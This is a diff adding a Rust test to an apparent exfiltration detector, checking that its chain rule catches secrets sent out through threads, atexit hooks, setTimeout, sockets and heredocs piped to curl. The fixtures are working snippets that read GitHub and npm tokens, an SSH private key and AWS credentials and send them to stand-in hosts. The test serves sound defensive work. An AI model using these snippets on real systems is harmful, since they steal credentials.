@@ -4414,6 +4414,58 @@ mod reconcile {
         assert_eq!(chained("sync.py", &local, "EXFIL-CHAIN-001"), None);
     }
 
+    /// Shapes the value reading lost that the second verifier's probes found
+    /// on 8f8fd64 (hand-written; each linked with e45efc5), and one false
+    /// link 8f8fd64's heredoc reading made, with the real rules: a helper
+    /// handed the secret by reference, a socket connected by a method call
+    /// and then sent on, and a heredoc that belongs to another command.
+    #[test]
+    fn value_reading_follows_references_and_connected_objects() {
+        let collect = "https://collector.example.net/c";
+        let helper = format!(
+            "import os\nimport threading\nimport requests\ntoken = os.environ[\"GITHUB_TOKEN\"]\n\ndef upload(token):\n    requests.post(\"{collect}\", data=token)\n\n"
+        );
+        for tail in [
+            "threading.Thread(target=upload, args=(token,), daemon=True).start()\n",
+            "atexit.register(upload, token)\n",
+        ] {
+            let src = format!("{helper}{tail}");
+            assert_eq!(
+                chained("sync.py", &src, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{tail}"
+            );
+        }
+        let src =
+            format!("{helper}threading.Thread(target=upload, args=(\"anonymous\",)).start()\n");
+        assert_eq!(chained("sync.py", &src, "EXFIL-CHAIN-001"), None);
+        let js = format!(
+            "const token = process.env.NPM_TOKEN;\nfunction upload(token) {{\n  return fetch(\"{collect}\", {{ method: \"POST\", body: token }});\n}}\nsetTimeout(upload, 0, token);\n"
+        );
+        assert_eq!(
+            chained("sync.js", &js, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        let socket = "import os\nimport socket\nkey = open(os.path.expanduser(\"~/.ssh/id_rsa\")).read()\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(5)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)\ns.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\ns.connect((\"203.0.113.9\", 4444))\ns.sendall(key.encode())\n";
+        assert!(fires("sync.py", socket, "NET-009"));
+        assert_eq!(
+            chained("sync.py", socket, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        let ping = socket.replace("s.sendall(key.encode())", "s.sendall(b\"PING\")");
+        assert_eq!(chained("sync.py", &ping, "EXFIL-CHAIN-001"), None);
+        let other = "#!/bin/bash\nTOKEN=\"$(cat ~/.aws/credentials)\"\ncurl -s https://status.example.com/ping && cat <<EOF > notes.txt\n$TOKEN\nEOF\n";
+        assert!(fires("ping.sh", other, "NET-012"));
+        assert_eq!(chained("ping.sh", other, "EXFIL-CHAIN-001"), None);
+        let piped = format!(
+            "#!/bin/bash\nTOKEN=\"$(cat ~/.aws/credentials)\"\ncat <<EOF | curl -s -X POST --data-binary @- {collect}\n$TOKEN\nEOF\n"
+        );
+        assert_eq!(
+            chained("sync.sh", &piped, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
     /// One propagation step (a line between source and sink that assigns an
     /// expression using the bound name makes the new name a source too) was
     /// measured and not adopted; see docs/detection/correlation-names.md.
